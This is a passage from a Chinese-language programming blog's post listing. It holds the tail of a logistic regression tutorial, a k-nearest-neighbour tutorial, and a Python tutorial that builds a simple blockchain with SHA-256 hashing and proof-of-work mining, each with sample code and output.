1</span></span><br><span class="line">        weights = weights - lr * temp  <span class="comment"># 更新权重</span></span><br><span class="line">    <span class="keyword">return</span> weights</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将大于0.5的归入1类，其他的为0类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">y</span>):</span></span><br><span class="line">    preds = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> y:</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0.5</span>:</span><br><span class="line">            preds.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            preds.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> preds</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">dataArr, labelMat = loadDataSet(training_sample)  <span class="comment"># 读入训练样本中的原始数据</span></span><br><span class="line">A = gradAscent(dataArr, labelMat)  <span class="comment"># 回归系数的值</span></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">dataArr, labelMat = loadDataSet(testing_sample)</span><br><span class="line">h = sigmoid(np.mat(dataArr)*A)  <span class="comment"># 预测结果的值</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;real: &quot;</span></span><br><span class="line"><span class="built_in">print</span> labelMat</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;predict: &quot;</span></span><br><span class="line"><span class="built_in">print</span> predict(h)</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python logistic_regression.py</span><br><span class="line">real:</span><br><span class="line">[1, 0, 0, 1, 1, 1, 0, 1, 0, 0]</span><br><span class="line">predict:</span><br><span class="line">[1, 0, 0, 1, 1, 1, 0, 1, 0, 0]</span><br></pre></td></tr></table></figure>
<p>预测结果与实际结果完全相同。<br><strong>reference</strong><br>《机器学习实战》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/22/k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/22/k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">k-近邻算法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-22 15:58:55" itemprop="dateCreated datePublished" datetime="2018-05-22T15:58:55+08:00">2018-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近一直在做机器学习相关的工作，但是对机器学习的基础还没有什么太好的掌握，所以打算从头开始学习一些基本的算法，太深入的数学原理先不深究，需要用到时再补吧（说得跟真的一样）。<br>$k$-近邻算法，它的工作原理是：存在一个样本数据集合，也称作训练样本集，并且样本集中每个<code>数据</code>都存在标签，即我们知道样本集中每个<code>数据</code>与所属分类的对应关系。输入没有标签的新数据后，将新数据的每个特征与样本集中<code>数据</code>对应的特征进行比较，然后算法提取样本集中特征最相似<code>数据</code>的分类标签。一般来说，我们只选择样本数据集中前$k$个最相似的<code>数据</code>，这就是$k$-近邻算法中$k$的出处，通常$k$是不大于20的整数。最后，选择$k$个最相似数据中出现次数最多的分类，作为新数据的分类。  </p>
<h3 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h3><p>创建名为kNN.py的文件：<br><strong>代码清单</strong> kNN.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="comment"># 创建数据集和标签</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    group = array([[<span class="number">1.0</span>, <span class="number">1.1</span>], [<span class="number">1.0</span>, <span class="number">1.0</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0.1</span>]])</span><br><span class="line">    labels = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> group, labels</span><br></pre></td></tr></table></figure>
<p>这里有四组数据，每组有两个特征，labels包含了每组数据的标签，将数据点(1, 1.1)定义为类A，数据点(0, 0.1)定义为类B。<br><img src="/images/machinelearning/kNN.png"></p>
<h3 id="使用训练样本进行分类"><a href="#使用训练样本进行分类" class="headerlink" title="使用训练样本进行分类"></a>使用训练样本进行分类</h3><p>添加classify0()函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify0</span>(<span class="params">inX, dataSet, labels, k</span>):</span></span><br><span class="line">    <span class="comment"># 计算inX这个点和样本集中点的欧式距离</span></span><br><span class="line">    dataSetSize = dataSet.shape[<span class="number">0</span>] <span class="comment"># 数据集大小为4</span></span><br><span class="line">    diffMat = tile(inX, (dataSetSize, <span class="number">1</span>)) - dataSet <span class="comment"># 将输入的点复制为和数据集一样大小的4*1的矩阵</span></span><br><span class="line">    sqDiffMat = diffMat**<span class="number">2</span> <span class="comment"># 矩阵中的元素的平方</span></span><br><span class="line">    sqDistances = sqDiffMat.<span class="built_in">sum</span>(axis = <span class="number">1</span>) <span class="comment"># 矩阵每一行求和</span></span><br><span class="line">    distances = sqDistances**<span class="number">0.5</span></span><br><span class="line">    sortedDistIndicies = distances.argsort() <span class="comment"># 距离排序</span></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="comment"># 前k个距离最小的点的标签</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        voteIlabel = labels[sortedDistIndicies[i]]</span><br><span class="line">        classCount[voteIlabel] = classCount.get(voteIlabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    sortedClassCount = <span class="built_in">sorted</span>(classCount.iteritems(),</span><br><span class="line">            key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">group, labels = createDataSet()</span><br><span class="line"><span class="built_in">print</span> classify0([<span class="number">0</span>,<span class="number">0</span>], group, labels, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python kNN.py</span><br><span class="line">B</span><br></pre></td></tr></table></figure>
<p>对输入向量inX进行分类，训练样本集为dataSet，标签向量为labels，k表示选择最近邻居的数目。计算两点X和A的距离用欧式距离公式：<br>$$<br>d = \sqrt{(X_0-A_0)^{2}+(X_1-A_1)^{2}}<br>$$<br>例如，点(0, 0)和(1, 1)之间的距离：<br>$$<br>\sqrt{(1-0)^{2}+(1-0)^{2}}<br>$$<br>得出inX与各训练样本集中各点的距离，按距离从小到大排序，选择前k个点，这前k个点中出现最多的标签，即为inX的类。<br><strong>reference</strong><br>《机器学习实战》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/20/%E7%94%A8Python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/20/%E7%94%A8Python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">用Python实现简单的区块链（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-20 23:23:44" itemprop="dateCreated datePublished" datetime="2018-05-20T23:23:44+08:00">2018-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这篇文章用python实现一下区块链的基本概念，主要目的是凑热闹学习区块链相关知识，没有太大实际用途。  </p>
<h2 id="创建区块链"><a href="#创建区块链" class="headerlink" title="创建区块链"></a>创建区块链</h2><p>区块链就是许多区块的链表，区块链里的每个链表都有自己的签名，包含前一个区块的数字签名和一些数据（例如交易）。<br><img src="/images/blockchain/basic.png"><br>每个区块有前一个区块的hash，也有自己的hash，自己的hash包含了自己的数据和前一个区块的hash。如果前一个区块的数据改变了，那么前一个区块的hash就会改变，后面的区块都会受到影响。计算和比较hash可以检查一个区块链是否合法。<br><strong>改变链表里的任何数据，都会改变签名，破坏链。</strong><br>首先创建组成区块链的Block类：<br><strong>代码清单</strong> block.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data, previousHash</span>):</span></span><br><span class="line">        self.data = data</span><br><span class="line">        self.previousHash = previousHash</span><br><span class="line">        self.timeStamp = time.time()</span><br><span class="line">        self.nonce = <span class="number">0</span></span><br><span class="line">        self.<span class="built_in">hash</span> = self.calculateHash()</span><br></pre></td></tr></table></figure>
<p>基本的Block包含了一个<code>hash</code>来保存数字签名，<code>previousHash</code>变量保存了前一个Block的hash，<code>data</code>保存该区块的数据。<br>下面需要一个方法来产生数字签名，这里使用sha256加密算法，调用Python的hashlib库，非常简单：<br><strong>代码清单</strong> strutils.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sha256</span>(<span class="params">msg</span>):</span></span><br><span class="line">        sh = hashlib.sha256()</span><br><span class="line">        sh.update(msg)</span><br><span class="line">        <span class="keyword">return</span> sh.hexdigest()</span><br></pre></td></tr></table></figure>
<p>下面为Block类添加一个计算hash的方法：<br><strong>代码清单</strong> block.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> strutils <span class="keyword">import</span> StringUtils</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calculateHash</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> StringUtils.sha256(self.previousHash+self.data+<span class="built_in">str</span>(self.nonce)+<span class="built_in">str</span>(self.timeStamp))</span><br></pre></td></tr></table></figure>
<p>创建几个区块打印hash测试一下是否能正确运行：<br><strong>代码清单</strong> noobchain.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> block <span class="keyword">import</span> Block</span><br><span class="line"></span><br><span class="line">genesisBlock = Block(<span class="string">&quot;Hi im the first block&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hash for block 1: &quot;</span> + genesisBlock.<span class="built_in">hash</span></span><br><span class="line">secondBlock = Block(<span class="string">&quot;Hi im the second block&quot;</span>, genesisBlock.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hash for block 2: &quot;</span> + secondBlock.<span class="built_in">hash</span></span><br><span class="line">thirdBlock = Block(<span class="string">&quot;Hi im the third block&quot;</span>, secondBlock.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hash for block 3: &quot;</span> + thirdBlock.<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python noobchain.py</span><br><span class="line">Hash for block 1: 9dbe25df31f62ecdda90aac0ab7b25603fcdada1f890c910a7e8007560ef9689</span><br><span class="line">Hash for block 2: bb2983a4837cdd83acdf398929babb592c8f9d4165b3eec07279d1bfcc49d199</span><br><span class="line">Hash for block 3: 1e2b74ee552ae2a59b5215eaab87e896e11c33e94541917323d1f2e58f47fa87</span><br></pre></td></tr></table></figure>
<p>现在每个区块都有自己的数字签名，基于自己的数据和前一个区块的签名。现在不太像一个区块链，所以我们用一个列表来存放这些区块。<br><strong>代码清单</strong> noobchain.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">blockchain = []</span><br><span class="line"></span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Hi im the first block&#x27;</span>, <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Yo im the second block&#x27;</span>, blockchain[<span class="built_in">len</span>(blockchain)<span class="number">-1</span>].<span class="built_in">hash</span>))</span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Hey im the third block&#x27;</span>, blockchain[<span class="built_in">len</span>(blockchain)<span class="number">-1</span>].<span class="built_in">hash</span>))</span><br><span class="line"></span><br><span class="line">blockdict = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> blockchain:</span><br><span class="line">    blockdict.append(b.__dict__)</span><br><span class="line"></span><br><span class="line">blockjson = json.dumps(blockdict, indent=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span> blockjson</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ python noobchain.py</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 0,</span><br><span class="line">        &quot;timeStamp&quot;: 1526824346.983302,</span><br><span class="line">        &quot;data&quot;: &quot;Hi im the first block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;6120bc136ad7d77d462ad7142864739035e66548bdb26104a4716e3c29690e89&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;0&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 0,</span><br><span class="line">        &quot;timeStamp&quot;: 1526824346.983333,</span><br><span class="line">        &quot;data&quot;: &quot;Yo im the second block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;b08a3eb3838c8897c55c107defcd758f094b3d4c0865c15820fcf93bd0fced96&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;6120bc136ad7d77d462ad7142864739035e66548bdb26104a4716e3c29690e89&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 0,</span><br><span class="line">        &quot;timeStamp&quot;: 1526824346.98334,</span><br><span class="line">        &quot;data&quot;: &quot;Hey im the third block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;31e787cb6ad0cb3a92922e61a525f47e1023ed426b30b17dc2d6efc58e020733&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;b08a3eb3838c8897c55c107defcd758f094b3d4c0865c15820fcf93bd0fced96&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>下面我们需要检查我们区块链的完整性，创建一个<code>isChainValid()</code>方法，这个方法循环整个链中的区块，比较hash，这个方法需要检查<code>hash</code>变量确实与计算的hash相等，前一个区块的hash与<code>previousHash</code>变量相等。<br><strong>代码清单</strong> noobchain.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isChainValid</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(blockchain)):</span><br><span class="line">        curblock = blockchain[i]</span><br><span class="line">        preblock = blockchain[i<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> curblock.<span class="built_in">hash</span> != curblock.calculateHash():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Current Hashes not equal&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> preblock.<span class="built_in">hash</span> != curblock.previousHash:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Previous Hashes not equal&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>任何对区块链中区块的改动都会让这个方法返回错误。<br>当人们将自己的区块链分享到比特币网络节点时，网络会接收其最长的有效链。如何阻止有人篡改一个旧区块中的数据，然后创建一整个新的更长的区块链到网络中。<code>工作量证明</code>——哈希现金工作量证明系统意味着它花费了可观的时间和计算量来创建新的区块。因此，攻击者会用到比其他人加起来还要多的计算量。  </p>
<h2 id="开始采矿"><a href="#开始采矿" class="headerlink" title="开始采矿"></a>开始采矿</h2><p>我们让矿工通过尝试区块中不同的变量，直到它的hash由一定数量的0开头来做工作量证明。<br>在<code>calculateHash()</code>方法中加入<code>nonce</code>变量，还需要<code>mineBlock()</code>方法：<br><strong>代码清单</strong> block.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data, previousHash</span>):</span></span><br><span class="line">        self.data = data</span><br><span class="line">        self.previousHash = previousHash</span><br><span class="line">        self.timeStamp = time.time()</span><br><span class="line">        self.nonce = <span class="number">0</span></span><br><span class="line">        self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calculateHash</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> sha256(self.previousHash+self.data+<span class="built_in">str</span>(self.nonce)+<span class="built_in">str</span>(self.timeStamp))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mineBlock</span>(<span class="params">self, difficulty</span>):</span></span><br><span class="line">        target = <span class="string">&#x27;0&#x27;</span>*difficulty</span><br><span class="line">        <span class="keyword">while</span> self.<span class="built_in">hash</span>[<span class="number">0</span>:difficulty] != target:</span><br><span class="line">            self.nonce += <span class="number">1</span></span><br><span class="line">            self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Block Mined!!! : &quot;</span> + self.<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
<p><code>mineBlock()</code>方法需要一个<code>difficulty</code>参数，来指定他们需要产生0的个数。<br><strong>代码清单</strong> noobchain.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">difficulty = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Hi im the first block&#x27;</span>, <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Trying to mine block 1...&#x27;</span></span><br><span class="line">blockchain[<span class="number">0</span>].mineBlock(difficulty)</span><br><span class="line"></span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Yo im the second block&#x27;</span>, blockchain[<span class="built_in">len</span>(blockchain)<span class="number">-1</span>].<span class="built_in">hash</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Trying to mine block 2...&#x27;</span></span><br><span class="line">blockchain[<span class="number">1</span>].mineBlock(difficulty)</span><br><span class="line"></span><br><span class="line">blockchain.append(Block(<span class="string">&#x27;Hey im the third block&#x27;</span>, blockchain[<span class="built_in">len</span>(blockchain)<span class="number">-1</span>].<span class="built_in">hash</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Trying to mine block 3...&#x27;</span></span><br><span class="line">blockchain[<span class="number">2</span>].mineBlock(difficulty)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Blockchain is Valid:&#x27;</span> + <span class="built_in">str</span>(isChainValid())</span><br><span class="line"></span><br><span class="line">blockdict = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> blockchain:</span><br><span class="line">    blockdict.append(b.__dict__)</span><br><span class="line"></span><br><span class="line">blockjson = json.dumps(blockdict, indent=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span> blockjson</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ python noobchain.py</span><br><span class="line">Trying to mine block 1...</span><br><span class="line">Block Mined!!! : 00000ecb9f53da95a26ee8316131bda984bc3afb037a8bdf29074004261b839b</span><br><span class="line">Trying to mine block 2...</span><br><span class="line">Block Mined!!! : 00000e576c0879015c408e6ec870a25745d7049588aef35fcc28c4f071524f8f</span><br><span class="line">Trying to mine block 3...</span><br><span class="line">Block Mined!!! : 00000137d52d6a04821f5aa3bc77dd0c51b768e415e8b44115b36b80f62b9b2c</span><br><span class="line">Blockchain is Valid:True</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 392303,</span><br><span class="line">        &quot;timeStamp&quot;: 1526829543.310173,</span><br><span class="line">        &quot;data&quot;: &quot;Hi im the first block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;00000ecb9f53da95a26ee8316131bda984bc3afb037a8bdf29074004261b839b&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;0&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 1228895,</span><br><span class="line">        &quot;timeStamp&quot;: 1526829544.882065,</span><br><span class="line">        &quot;data&quot;: &quot;Yo im the second block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;00000e576c0879015c408e6ec870a25745d7049588aef35fcc28c4f071524f8f&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;00000ecb9f53da95a26ee8316131bda984bc3afb037a8bdf29074004261b839b&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;nonce&quot;: 3053359,</span><br><span class="line">        &quot;timeStamp&quot;: 1526829550.066907,</span><br><span class="line">        &quot;data&quot;: &quot;Hey im the third block&quot;,</span><br><span class="line">        &quot;hash&quot;: &quot;00000137d52d6a04821f5aa3bc77dd0c51b768e415e8b44115b36b80f62b9b2c&quot;,</span><br><span class="line">        &quot;previousHash&quot;: &quot;00000e576c0879015c408e6ec870a25745d7049588aef35fcc28c4f071524f8f&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>挖矿每个区块大约要花费3秒。  </p>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://medium.com/programmers-blockchain/create-simple-blockchain-java-tutorial-from-scratch-6eeed3cb03fa">https://medium.com/programmers-blockchain/create-simple-blockchain-java-tutorial-from-scratch-6eeed3cb03fa</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
